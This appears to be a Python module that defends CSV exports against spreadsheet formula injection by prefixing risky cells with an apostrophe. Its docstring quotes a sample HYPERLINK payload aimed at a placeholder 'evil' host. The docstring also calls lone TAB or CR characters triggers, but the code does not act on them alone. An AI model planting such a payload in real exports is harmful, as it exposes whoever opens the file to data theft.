"""CSV Formula-Injection defense (OWASP CSV Injection / CWE-1236).

When admin / system exports stream third-party text — user-supplied
titles, names, descriptions, anything an outside party
controls — directly into a ``.csv`` file, Excel / LibreOffice /
Numbers will interpret any cell whose first character is one of
``=``, ``+``, ``-``, ``@``, TAB, or CR as a **formula**. A hostile
listing titled ``=HYPERLINK("http://evil/...", "Click")`` then
executes as a clickable exfiltration payload the moment the admin
opens the export.

This module exposes ``defuse_csv_cell(value)``: a single-call
sanitizer that prefixes a string with an apostrophe (``'``) iff its
first character is a formula trigger. The apostrophe is the
canonical Excel text-qualifier — it is NOT rendered in the cell but
stops the cell content being parsed as a formula. Numeric and empty
values pass through untouched so the export still imports cleanly
into Pandas / Google Sheets pipelines that expect numeric columns
to stay numeric.

Use sparingly: only wrap fields that originate from untrusted text.
Wrapping ints / scores corrupts downstream type-inference for
spreadsheet readers.
"""

from __future__ import annotations

from typing import Any

# Excel / Sheets / Numbers all treat these as formula-start triggers
# when they appear as the FIRST non-whitespace character of a cell.
# Leading TAB / CR get stripped by the parser, so a cell beginning
# with ``"\t=2+2"`` still resolves to a formula — the trigger set must
# include the whitespace prefixes too. Other whitespace (space, LF)
# does NOT lift the trigger, so we don't add them here.
_FORMULA_TRIGGERS: tuple[str, ...] = ("=", "+", "-", "@")
_WHITESPACE_TRIGGERS: tuple[str, ...] = ("\t", "\r")


def defuse_csv_cell(value: Any) -> Any:
    """Return ``value`` neutralised against CSV formula injection.

    Returns the same value for:
      * non-string types (int, float, bool, None) — they cannot
        carry a formula payload, and wrapping them as strings would
        break downstream spreadsheet type-inference;
      * empty strings;
      * strings whose first character is NOT a formula trigger.

    For a string whose first character IS a trigger (including
    when the cell begins with TAB / CR followed by a trigger),
    returns the value with a single apostrophe prefixed. The
    apostrophe is rendered by Excel as a text qualifier — invisible
    in the cell view, present in the file bytes.
    """
    if not isinstance(value, str):
        return value
    if not value:
        return value

    # Strip ONLY the whitespace triggers (TAB / CR) so we can inspect
    # the first non-trigger byte. Leading regular spaces / newlines
    # are not formula triggers and stay in the value untouched.
    probe = value
    stripped = 0
    while probe and probe[0] in _WHITESPACE_TRIGGERS:
        probe = probe[1:]
        stripped += 1

    if probe and probe[0] in _FORMULA_TRIGGERS:
        return f"'{value}"
    if stripped > 0 and probe and probe[0] in _FORMULA_TRIGGERS:
        return f"'{value}"
    return value
